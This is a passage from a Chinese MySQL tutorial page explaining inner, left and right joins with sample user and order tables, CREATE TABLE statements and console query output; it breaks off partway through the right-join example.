多表联合查询</font><a href="post/MySQL-Primer#九-多表联合查询"></a></h3><p><font face="Comic sans MS">很多时候在实际的业务中我们不只是查询一张表、在电子商务系统中，查询哪些用户没有购买过产品、银行中可能查询违规记录，同时查询出用户的查询中奖信息和中奖人员的基本信息、以上只是列的情况我们就需要把两张表在一起进行查询。<br>而上述业务中需要多表联合在一起查询才能有结果，而多表联合查询的本质是：<font color="#FF7F00"><strong>表连接</strong></font>。<br></font></p><p>&emsp;</p><h4 id="9-1-表连接"><font color="#3CB371" face="Comic sans MS">9.1 表连接</font><a href="post/MySQL-Primer#9-1-表连接"></a></h4><p>当需要查询多个表中的字段时，就可以使用表连接来实现。表联接分为<font color="#FF7F00"><strong>内连接</strong></font>和<font color="#FF7F00"><strong>外连接</strong></font>。</p><p><font color="#00B2EE"><strong>内联结：</strong></font>将两个表中存在联结关系的字段符合联结关系的那些记录形成记录集的联结。<br><font color="#00B2EE"><strong>外连接：</strong></font>会选出其他不匹配的记录，分为外左联结和外右联结。</p><p>&emsp;<br>在学习实验前，我为大家准备了两个模拟的数据表：<br>用户表，存放用户信息<br>订单表，存放哪个用户购买过哪个商品<br>user表创建语句:<br><font color="#00B2EE"></font></p><pre class="line-numbers language-php"><code class="language-php"><span class="token constant">CREATE</span> <span class="token constant">TABLE</span> <span class="token keyword">IF</span> <span class="token constant">NOT</span> <span class="token constant">EXISTS</span> <span class="token function">user</span> <span class="token punctuation">(</span>   uid <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token keyword">NULL</span><span class="token punctuation">,</span>   username <span class="token function">varchar</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token keyword">NULL</span><span class="token punctuation">,</span>   password <span class="token function">char</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token keyword">NULL</span> <span class="token punctuation">)</span> <span class="token constant">ENGINE</span><span class="token operator">=</span>InnoDB <span class="token keyword">DEFAULT</span> <span class="token constant">CHARSET</span><span class="token operator">=</span>utf8<span class="token punctuation">;</span><span class="token constant">CREATE</span> <span class="token constant">TABLE</span> <span class="token keyword">IF</span> <span class="token constant">NOT</span> <span class="token constant">EXISTS</span> <span class="token function">order_goods</span> <span class="token punctuation">(</span>   oid <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token keyword">NULL</span><span class="token punctuation">,</span>   uid <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token keyword">NULL</span><span class="token punctuation">,</span>   name <span class="token function">varchar</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token keyword">NULL</span><span class="token punctuation">,</span>   buytime <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token keyword">NULL</span> <span class="token punctuation">)</span> <span class="token constant">ENGINE</span><span class="token operator">=</span>InnoDB <span class="token keyword">DEFAULT</span> <span class="token constant">CHARSET</span><span class="token operator">=</span>utf8<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>user表数据如下：</p><pre class="line-numbers language-php"><code class="language-php">uid    username    password<span class="token number">1</span>    景甜    <span class="token number">123456</span><span class="token number">2</span>    王小二    <span class="token number">245667</span><span class="token number">3</span>    王宝强    <span class="token number">1235531</span><span class="token number">4</span>    井柏然    <span class="token number">123455</span><span class="token number">5</span>    范冰冰    5abcwa<span class="token number">6</span>    黄晓明    abcdeef<span class="token number">7</span>    anglebaby    caption<span class="token number">8</span>    <span class="token constant">TFBOYS</span>    abcdwww<span class="token number">9</span>    安小超    12tfddwd<span class="token number">10</span>    高小峰    3124qwqw<span class="token number">11</span>    李小强    323fxfvdvd<span class="token number">12</span>    李小超    311aqqee<span class="token number">13</span>    韩小平    121rcfwrfq<span class="token number">14</span>    宋小康    123123tcsd<span class="token number">15</span>    佟小刚    3cxvdfs<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>order_goods数据如下：</p><pre class="line-numbers language-php"><code class="language-php">oid    uid    name    buytime<span class="token number">1</span>    <span class="token number">10</span>    苹果鼠标    <span class="token number">1212313</span><span class="token number">2</span>    <span class="token number">3</span>    iphone 12s    <span class="token number">123121241</span><span class="token number">3</span>    <span class="token number">12</span>    雪碧       <span class="token number">13232333</span><span class="token number">4</span>    <span class="token number">15</span>    <span class="token number">34242123</span><span class="token number">5</span>    <span class="token number">3</span>    iphone 键盘    <span class="token number">12123413</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>注意：</strong>在上表order_goods表中uid是指user表中的uid字段。上表中oid为1的数据行，uid为10的用户。为user表中uid为10的用户：高小峰。该用户购买了商品为苹果鼠标。购买时间buytime为一个unix时间戳。</p></blockquote><p>&emsp;</p><h4 id="9-2-内连接"><font color="#3CB371" face="Comic sans MS">9.2 内连接</font><a href="post/MySQL-Primer#9-2-内连接"></a></h4><p>基本语法一：<br><font color="#00B2EE"></font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">类型</th><th align="left">详细说明</th></tr></thead><tbody><tr><td align="center">基本语法</td><td align="left">select 表1.字段 [as 别名],表n.字段  from 表1 [别名],表n where 条件;</td></tr><tr><td align="center">示例</td><td align="left">select user.uid ,user.username as username,order_goods.oid,order_goods.uid,<br>order_goods.name as shopname from user,order_goods  where user.uid = order_goods.uid;</td></tr><tr><td align="center">示例说明</td><td align="left">查询商品表中哪些用户购买过商品，并将用户信息显示出来</td></tr></tbody></table></div></div><blockquote><p><font color="#FF7F00"><strong>注：下例中from 表使用到了表别名。</strong><br><strong>由于表名太长，每次写的时候容易写错。我们可以在表后直接跟上一个简写英文字符串。在前面拼接字段时，直接使用简写字符串.字段即可。</strong></font></p></blockquote><pre class="line-numbers language-php"><code class="language-php">mysql<span class="token operator">></span> select u<span class="token punctuation">.</span>uid <span class="token punctuation">,</span>u<span class="token punctuation">.</span>username <span class="token keyword">as</span> username<span class="token punctuation">,</span>o<span class="token punctuation">.</span>oid<span class="token punctuation">,</span>o<span class="token punctuation">.</span>uid<span class="token punctuation">,</span>o<span class="token punctuation">.</span>name <span class="token keyword">as</span> shopname from user u<span class="token punctuation">,</span>order_goods o  where u<span class="token punctuation">.</span>uid <span class="token operator">=</span> o<span class="token punctuation">.</span>uid<span class="token punctuation">;</span> <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span> <span class="token operator">|</span> uid <span class="token operator">|</span> username  <span class="token operator">|</span> oid <span class="token operator">|</span> uid <span class="token operator">|</span> shopname      <span class="token operator">|</span> <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span> <span class="token operator">|</span>  <span class="token number">10</span> <span class="token operator">|</span> 高小峰    <span class="token operator">|</span>   <span class="token number">1</span> <span class="token operator">|</span>  <span class="token number">10</span> <span class="token operator">|</span> 苹果鼠标      <span class="token operator">|</span> <span class="token operator">|</span>   <span class="token number">3</span> <span class="token operator">|</span> 王宝强    <span class="token operator">|</span>   <span class="token number">2</span> <span class="token operator">|</span>   <span class="token number">3</span> <span class="token operator">|</span> iphone 12s    <span class="token operator">|</span> <span class="token operator">|</span>  <span class="token number">12</span> <span class="token operator">|</span> 李小超    <span class="token operator">|</span>   <span class="token number">3</span> <span class="token operator">|</span>  <span class="token number">12</span> <span class="token operator">|</span> 雪碧          <span class="token operator">|</span> <span class="token operator">|</span>  <span class="token number">15</span> <span class="token operator">|</span> 佟小刚    <span class="token operator">|</span>   <span class="token number">4</span> <span class="token operator">|</span>  <span class="token number">15</span> <span class="token operator">|</span>               <span class="token operator">|</span> <span class="token operator">|</span>   <span class="token number">3</span> <span class="token operator">|</span> 李文凯    <span class="token operator">|</span>   <span class="token number">5</span> <span class="token operator">|</span>   <span class="token number">3</span> <span class="token operator">|</span> iphone 键盘   <span class="token operator">|</span> <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span> <span class="token number">5</span> rows in <span class="token function">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>基本语法二：<br><font color="#00B2EE"></font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">类型</th><th align="left">详细说明</th></tr></thead><tbody><tr><td align="center">基本语法</td><td align="left">select 表1.字段 [as 别名],表n.字段  from 表1 INNER JOIN 表n on  条件;</td></tr><tr><td align="center">示例</td><td align="left">select user.uid ,user.username as username,order_goods.oid,order_goods.uid,<br>order_goods.name as shopname from user inner join order_goods  on  user.uid = <br>order_goods.uid;</td></tr><tr><td align="center">示例说明</td><td align="left">查询商品表中哪些用户购买过商品，并将用户信息显示出来</td></tr></tbody></table></div></div><p>&emsp;<br>结果与基本语法1中一致。</p><pre class="line-numbers language-php"><code class="language-php">mysql<span class="token operator">></span> select user<span class="token punctuation">.</span>uid <span class="token punctuation">,</span>user<span class="token punctuation">.</span>username <span class="token keyword">as</span> username<span class="token punctuation">,</span>order_goods<span class="token punctuation">.</span>oid<span class="token punctuation">,</span>order_goods<span class="token punctuation">.</span>uid<span class="token punctuation">,</span>order_goods<span class="token punctuation">.</span>name <span class="token keyword">as</span> shopname from user inner join order_goods  on  user<span class="token punctuation">.</span>uid <span class="token operator">=</span> order_goods<span class="token punctuation">.</span>uid<span class="token punctuation">;</span> <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span> <span class="token operator">|</span> uid <span class="token operator">|</span> username  <span class="token operator">|</span> oid <span class="token operator">|</span> uid <span class="token operator">|</span> shopname      <span class="token operator">|</span> <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span> <span class="token operator">|</span>  <span class="token number">10</span> <span class="token operator">|</span> 高小峰    <span class="token operator">|</span>   <span class="token number">1</span> <span class="token operator">|</span>  <span class="token number">10</span> <span class="token operator">|</span> 苹果鼠标      <span class="token operator">|</span> <span class="token operator">|</span>   <span class="token number">3</span> <span class="token operator">|</span> 王宝强    <span class="token operator">|</span>   <span class="token number">2</span> <span class="token operator">|</span>   <span class="token number">3</span> <span class="token operator">|</span> iphone 12s    <span class="token operator">|</span> <span class="token operator">|</span>  <span class="token number">12</span> <span class="token operator">|</span> 李小超    <span class="token operator">|</span>   <span class="token number">3</span> <span class="token operator">|</span>  <span class="token number">12</span> <span class="token operator">|</span> 雪碧          <span class="token operator">|</span> <span class="token operator">|</span>  <span class="token number">15</span> <span class="token operator">|</span> 佟小刚    <span class="token operator">|</span>   <span class="token number">4</span> <span class="token operator">|</span>  <span class="token number">15</span> <span class="token operator">|</span>               <span class="token operator">|</span> <span class="token operator">|</span>   <span class="token number">3</span> <span class="token operator">|</span> 王宝强    <span class="token operator">|</span>   <span class="token number">5</span> <span class="token operator">|</span>   <span class="token number">3</span> <span class="token operator">|</span> iphone 键盘   <span class="token operator">|</span> <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span> <span class="token number">5</span> rows in <span class="token function">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;</p><h4 id="9-3-外连接"><font color="#3CB371" face="Comic sans MS">9.3 外连接</font><a href="post/MySQL-Primer#9-3-外连接"></a></h4><p><font color="#00B2EE" face="Comic sans MS"><strong>外连接：左连接、右连接</strong>。</font><br>关键字：<font color="#FF7F00"><strong>left join、on、right join</strong></font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">说明</th><th align="left">详解</th></tr></thead><tbody><tr><td align="center">基本语法</td><td align="left">select 表1.字段 [as 别名],表n.字段  from 表1 LEFT JOIN 表n on  条件;</td></tr><tr><td align="center">示例</td><td align="left">select *  from user left join order_goods  on  user.uid = order_goods.uid;</td></tr><tr><td align="center">示例说明</td><td align="left">以左边为主，查询哪些用户未购买过商品，并将用户信息显示出来</td></tr></tbody></table></div></div><p>&emsp;<br><font color="#00B2EE" face="Comic sans MS"><strong>左连接：</strong>包含所有的左边表中的记录甚至是右边表中没有和它匹配的记录。</font></p><pre class="line-numbers language-php"><code class="language-php">mysql<span class="token operator">></span> select <span class="token operator">*</span>  from user left join order_goods  on  user<span class="token punctuation">.</span>uid <span class="token operator">=</span> order_goods<span class="token punctuation">.</span>uid<span class="token punctuation">;</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">|</span> uid <span class="token operator">|</span> username  <span class="token operator">|</span> password   <span class="token operator">|</span> oid  <span class="token operator">|</span> uid  <span class="token operator">|</span> name          <span class="token operator">|</span> buytime   <span class="token operator">|</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">|</span>  <span class="token number">10</span> <span class="token operator">|</span> 高小峰    <span class="token operator">|</span> 3124qwqw   <span class="token operator">|</span>    <span class="token number">1</span> <span class="token operator">|</span>   <span class="token number">10</span> <span class="token operator">|</span> 苹果鼠标      <span class="token operator">|</span>   <span class="token number">1212313</span> <span class="token operator">|</span><span class="token operator">|</span>   <span class="token number">3</span> <span class="token operator">|</span> 王宝强    <span class="token operator">|</span> <span class="token number">1235531</span>    <span class="token operator">|</span>    <span class="token number">2</span> <span class="token operator">|</span>    <span class="token number">3</span> <span class="token operator">|</span> iphone 12s    <span class="token operator">|</span> <span class="token number">123121241</span> <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">12</span> <span class="token operator">|</span> 李小超    <span class="token operator">|</span> 311aqqee   <span class="token operator">|</span>    <span class="token number">3</span> <span class="token operator">|</span>   <span class="token number">12</span> <span class="token operator">|</span> 雪碧          <span class="token operator">|</span>  <span class="token number">13232333</span> <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">15</span> <span class="token operator">|</span> 佟小刚    <span class="token operator">|</span> 3cxvdfs    <span class="token operator">|</span>    <span class="token number">4</span> <span class="token operator">|</span>   <span class="token number">15</span> <span class="token operator">|</span>               <span class="token operator">|</span>  <span class="token number">34242123</span> <span class="token operator">|</span><span class="token operator">|</span>   <span class="token number">3</span> <span class="token operator">|</span> 王宝强    <span class="token operator">|</span> <span class="token number">1235531</span>    <span class="token operator">|</span>    <span class="token number">5</span> <span class="token operator">|</span>    <span class="token number">3</span> <span class="token operator">|</span> iphone 键盘   <span class="token operator">|</span>  <span class="token number">12123413</span> <span class="token operator">|</span><span class="token operator">|</span>   <span class="token number">1</span> <span class="token operator">|</span> 景甜      <span class="token operator">|</span> <span class="token number">123456</span>     <span class="token operator">|</span> <span class="token keyword">NULL</span> <span class="token operator">|</span> <span class="token keyword">NULL</span> <span class="token operator">|</span> <span class="token keyword">NULL</span>          <span class="token operator">|</span>      <span class="token keyword">NULL</span> <span class="token operator">|</span><span class="token operator">|</span>   <span class="token number">2</span> <span class="token operator">|</span> 王小二    <span class="token operator">|</span> <span class="token number">245667</span>     <span class="token operator">|</span> <span class="token keyword">NULL</span> <span class="token operator">|</span> <span class="token keyword">NULL</span> <span class="token operator">|</span> <span class="token keyword">NULL</span>          <span class="token operator">|</span>      <span class="token keyword">NULL</span> <span class="token operator">|</span><span class="token operator">|</span>   <span class="token number">4</span> <span class="token operator">|</span> 井柏然    <span class="token operator">|</span> <span class="token number">123455</span>     <span class="token operator">|</span> <span class="token keyword">NULL</span> <span class="token operator">|</span> <span class="token keyword">NULL</span> <span class="token operator">|</span> <span class="token keyword">NULL</span>          <span class="token operator">|</span>      <span class="token keyword">NULL</span> <span class="token operator">|</span><span class="token operator">|</span>   <span class="token number">5</span> <span class="token operator">|</span> 范冰冰    <span class="token operator">|</span> 5abcwa     <span class="token operator">|</span> <span class="token keyword">NULL</span> <span class="token operator">|</span> <span class="token keyword">NULL</span> <span class="token operator">|</span> <span class="token keyword">NULL</span>          <span class="token operator">|</span>      <span class="token keyword">NULL</span> <span class="token operator">|</span><span class="token operator">|</span>   <span class="token number">6</span> <span class="token operator">|</span> 黄晓明    <span class="token operator">|</span> abcdeef    <span class="token operator">|</span> <span class="token keyword">NULL</span> <span class="token operator">|</span> <span class="token keyword">NULL</span> <span class="token operator">|</span> <span class="token keyword">NULL</span>          <span class="token operator">|</span>      <span class="token keyword">NULL</span> <span class="token operator">|</span><span class="token operator">|</span>   <span class="token number">7</span> <span class="token operator">|</span> anglebaby <span class="token operator">|</span> caption    <span class="token operator">|</span> <span class="token keyword">NULL</span> <span class="token operator">|</span> <span class="token keyword">NULL</span> <span class="token operator">|</span> <span class="token keyword">NULL</span>          <span class="token operator">|</span>      <span class="token keyword">NULL</span> <span class="token operator">|</span><span class="token operator">|</span>   <span class="token number">8</span> <span class="token operator">|</span> <span class="token constant">TFBOYS</span>    <span class="token operator">|</span> abcdwww    <span class="token operator">|</span> <span class="token keyword">NULL</span> <span class="token operator">|</span> <span class="token keyword">NULL</span> <span class="token operator">|</span> <span class="token keyword">NULL</span>          <span class="token operator">|</span>      <span class="token keyword">NULL</span> <span class="token operator">|</span><span class="token operator">|</span>   <span class="token number">9</span> <span class="token operator">|</span> 安小超    <span class="token operator">|</span> 12tfddwd   <span class="token operator">|</span> <span class="token keyword">NULL</span> <span class="token operator">|</span> <span class="token keyword">NULL</span> <span class="token operator">|</span> <span class="token keyword">NULL</span>          <span class="token operator">|</span>      <span class="token keyword">NULL</span> <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">11</span> <span class="token operator">|</span> 李小强    <span class="token operator">|</span> 323fxfvdvd <span class="token operator">|</span> <span class="token keyword">NULL</span> <span class="token operator">|</span> <span class="token keyword">NULL</span> <span class="token operator">|</span> <span class="token keyword">NULL</span>          <span class="token operator">|</span>      <span class="token keyword">NULL</span> <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">13</span> <span class="token operator">|</span> 韩小平    <span class="token operator">|</span> 121rcfwrfq <span class="token operator">|</span> <span class="token keyword">NULL</span> <span class="token operator">|</span> <span class="token keyword">NULL</span> <span class="token operator">|</span> <span class="token keyword">NULL</span>          <span class="token operator">|</span>      <span class="token keyword">NULL</span> <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">14</span> <span class="token operator">|</span> 宋小康    <span class="token operator">|</span> 123123tcsd <span class="token operator">|</span> <span class="token keyword">NULL</span> <span class="token operator">|</span> <span class="token keyword">NULL</span> <span class="token operator">|</span> <span class="token keyword">NULL</span>          <span class="token operator">|</span>      <span class="token keyword">NULL</span> <span class="token operator">|</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token number">16</span> rows in <span class="token function">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font color="#00B2EE" face="Comic sans MS"><strong>右连接：</strong>包含所有的右边表中的记录甚至是右边表中没有和它匹配的记录。</font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">说明</th><th align="left">详解</th></tr></thead><tbody><tr><td align="center">基本语法</td><td align="left">select 表1.字段 [as 别名],表n.字段  from 表1 right JOIN 表n on  条件;</td></tr><tr><td align="center">示例</td><td align="left">select *  from user right join order_goods  on  user.uid = order_goods.uid;</td></tr><tr><td align="center">示例说明</td><td align="left">查询商品表中哪些用户购买过商品，并将用户信息显示出来</td></tr></tbody></table></div></div><pre class="line-numbers language-php"><code class="language-php">mysql<span class="token operator">></span> select <span class="token operator">*</span>  from user right join order_goods  on  user<span class="token punctuation">.</span>uid <span class="token operator">=</span> order_goods<span class="token punctuation">.</span>uid<span class="token punctuation">;</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">|</span> uid  <span class="token operator">|</span> username  <span class="token operator">|</span> password <span class="token operator">|</span> oid <span class="token operator">|</span> uid <span class="token operator">|</span> name          <span class="token operator">|</span> buytime   <span class="token operator">|</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">|</span>   <span class="token number">10</span> <span class="token operator">|</span> 高小峰    <span class="token operator">|</span> 3124qwqw <span class="token operator">|</span>   <span class="token number">1</span> <span class="token operator">|</span>  <span class="token number">10</span> <span class="token operator">|</span> 苹果鼠标      <span class="token operator">|</span>   <span class="token number">1212313</span> <span class="token operator">|</span><span class="token operator">|</span>    <span class="token number">3</span> <span class="token operator">|</span> 王宝强    <span class="token operator">|</span> <span class="token number">1235531</span>  <span class="token operator">|</span>   <span class="token number">2</span> <span class="token operator">|</span>   <span class="token number">3</span> <span class="token operator">|</span> iphone 12s    <span class="token operator">|</span> <span class="token number">123121241</span> <span class="token operator">|</span><span class="token operator">|</span>   <span class="token number">12</span> <span class="token operator">|</span> 李小超    <span class="token operator">|</span> 311aqqee <span class="token operator">|</span>   <span class="token number">3</span> <span class="token operator">|</span>  <span class="token number">12</span> <span class="token operator">|</span> 雪碧          <span class="token operator">|</span>  <span class="token number">13232333</span> <span class="token operator">|</span><span class="token operator">|</span>   <span class="token number">15</span> <span class="token operator">|</span> 佟小刚    <span class="token operator">|</span> 3cxvdfs  <span class="token operator">|</span>   <span class="token number">4</span> <span class="token operator">|</span>  <span class="token number">15</span> <span class="token operator">|</span>               <span class="token operator">|</span>  <span class="token number">34242123</span> <span 